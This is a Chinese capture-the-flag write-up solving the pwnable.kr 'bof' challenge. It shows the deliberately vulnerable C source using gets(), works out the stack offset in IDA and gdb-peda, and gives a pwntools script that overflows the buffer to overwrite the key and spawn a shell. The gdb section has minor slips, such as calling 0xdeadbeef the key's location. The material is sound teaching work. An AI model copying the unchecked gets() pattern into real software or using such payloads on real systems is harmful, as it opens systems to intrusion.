一道非常简单的缓冲区溢出的题


01

题目描述

02

下载、查看一下题目源码

#include <stdio.h>

#include <string.h>

#include <stdlib.h>

void func(int key){

char overflowme[32];

printf("overflow me : ");

gets(overflowme);// smash me!

if(key == 0xcafebabe){

system("/bin/sh");

}

else{

printf("Nah..\n");

}

}

int main(int argc, char* argv[]){

func(0xdeadbeef);

return 0;

}


可以看出

func()中有一个长度为32的字符串数组overflow
在调用gets()时由于没有检查字符串长度，导致缓冲区溢出，超过32字节的数据将覆盖内存中的其他数据。
随后比较key和0xcafebabe

main中调用func时参数key指定为0xdeadbeef，在进入func后会落入else分支。



如何溢出

03

gets()函数并没有对输入的长度进行限制，因此我们可以溢出overflowme数组来改写参数key

改写的值为0xCAFEBABE

可以执行system函数

IDA 调试

04

可以看出a1就是源码中的key

可以看到key的位置在ebp+8h处

而局部变量overflowme 对应s 首地址在ebp-2ch处。

因此，二者的距离为0x34.

计算出距离就可以写脚本溢出了，这里用到python中的pwntools库


from pwn import *

#p = process("./bof")

p = remote("pwnable.kr",9000)

sys_addr = 0xcafebabe

#p.recvuntil("overflow me :")

payload = "a"*0x34 + p32(sys_addr)

p.send(payload)

p.interactive()

gdb-peda调试

02

首先需要知道变量overflow和key存储在内存的什么位置，确定缓存区溢出发生的位置

首先在main函数下一个断点

gdb-peda$ b main

然后运行程序

gdb-peda$ r

现在程序停在了刚才下的断点处

单步调试(ni)至call <funC>后进入函数（si），一直跟到call <get>

查看一下栈中的情况

gdb-peda$ x /40xw $esp

esp中存储的是overflow开始的位置

overflow 开始的位置是0xffffcedc

而key的位置是 0xdeadbeef

0xffffcf10 - 0xffffcedc = 52
